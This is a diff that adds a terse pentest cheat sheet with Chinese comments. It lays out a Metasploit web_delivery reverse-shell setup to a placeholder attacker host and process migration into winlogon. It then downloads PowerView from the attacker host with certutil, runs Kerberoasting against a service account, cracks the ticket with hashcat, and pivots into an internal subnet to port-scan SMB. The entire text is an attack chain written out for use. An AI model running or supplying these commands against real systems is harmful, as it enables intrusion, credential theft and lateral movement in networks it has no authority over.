@@ -1,1 +1,32 @@
+msf delivery:
+sudo msfconsole -q
+search web_delivery
+set payload windows/x64/meterpreter/reverse_tcp      选择playload
+set LHOST PWNIP
+set SRVHOST PWNIP
+set TARGET 2      选择编程语言
+exploit / run
+在目标机器cml执行encoded script
+ps      查看所有进程id
+getpid  当前进程id
+migrate <winlogin.exe pid>      迁移到 winlogin ，更稳定
+python3 -m http.server 8000
+meterpreter > shell    在目标机启动shell
+cd C:\   跳到简单目录
+C:\> certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1      从攻击机想目标传送工具
+C:\> powershell  在目标机启动powershell
+C:\> cImport-Module .\PowerView.ps1
+C:\> cGet-DomainUser * -SPN | select samaccountname      查找 SPN 账户
+C:\> cGet-DomainUser -identity svc_sql | get-domainspnticket -format hashcat      用 svc_sql 账户，获得票据
+echo ' <票据> '| tr -d "[:space:]"  > tgs_file      清楚空格和换行
+hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt      本地破解哈希
+meterpreter > run autoroute -s 172.16.6.0/24      在 Meterpreter 会话添加路由，让攻击机通过跳板机，访问目标内网 172.16.6.0/24 网段
+bg      后台当前session
+use auxiliary/scanner/portscan/tcp
+set rhosts 172.16.6.0/24
+set PORTS 139,445
+set threads 50
+run
+
+
 
